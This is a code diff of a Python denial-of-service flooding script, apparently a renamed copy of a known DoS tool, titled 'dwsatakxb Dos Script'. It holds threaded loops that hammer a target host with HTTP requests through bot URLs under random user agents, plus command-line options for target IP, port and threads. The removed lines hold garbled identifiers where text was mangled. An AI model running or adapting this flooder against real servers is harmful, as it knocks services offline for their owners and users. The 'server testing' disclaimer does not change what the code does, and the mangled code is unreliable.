@@ -34,8 +34,8 @@ def my_bots():
 def bot_dwsatakxbing(url):
 	try:
 		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,dws atak xbs={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is dws atak xbing...\033[0m")
+			req = urllib.request.urlopen(urllib.request.Request(url,dwsatakxbs={'User-Agent': random.choice(uagent)}))
+			print("\033[94mbot is dwsatakxbing...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -70,22 +70,23 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_dws atak xbing(random.choice(bots)+"http://"+host)
+		bot_dwsatakxbing(random.choice(bots)+"http://"+host)
 		w.task_done()
 
 
 def usage():
+	print (''' \033[92m	dwsatakxb Dos Script v.1 http://www.canyalcin.com/
+	It is the end user's responsibility to obey all applicable laws.
+	It is just for server testing script. Your ip is visible. \n
+	usage : python3 dwsatakxb.py [-s] [-p] [-t]
  _____   _          __  _____            ___   _____       ___   _   _        __    __  _____  
 |  _  \ | |        / / /  ___/          /   | |_   _|     /   | | | / /       \ \  / / |  _  \ 
 | | | | | |  __   / /  | |___          / /| |   | |      / /| | | |/ /         \ \/ /  | |_| | 
 | | | | | | /  | / /   \___  \        / / | |   | |     / / | | | |\ \          }  {   |  _  { 
 | |_| | | |/   |/ /     ___| |       / /  | |   | |    / /  | | | | \ \        / /\ \  | |_| | 
-|_____/ |___/|___/     /_____/      /_/   |_|   |_|   /_/   |_| |_|  \_\      /_/  \_\ |_____/ 
+|_____/ |___/|___/     /_____/      /_/   |_|   |_|   /_/   |_| |_|  \_\      /_/  \_\ |_____/
 
-	print (''' \033[92m	dws atak xb Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 dws atak xb.py [-s] [-p] [-t]
+
 	-h : help
 	-s : server ip
 	-p : port default 80
@@ -122,11 +123,11 @@ def get_parameters():
 		thr = opts.turbo
 
 
-# reading dws atak xbs
+# reading headers
 global data
-headers = open("dws atak xb.txt", "r")
-data = dws atak xb.read()
-dws atak xb.close()
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
 #task queue are q,w
 q = Queue()
 w = Queue()
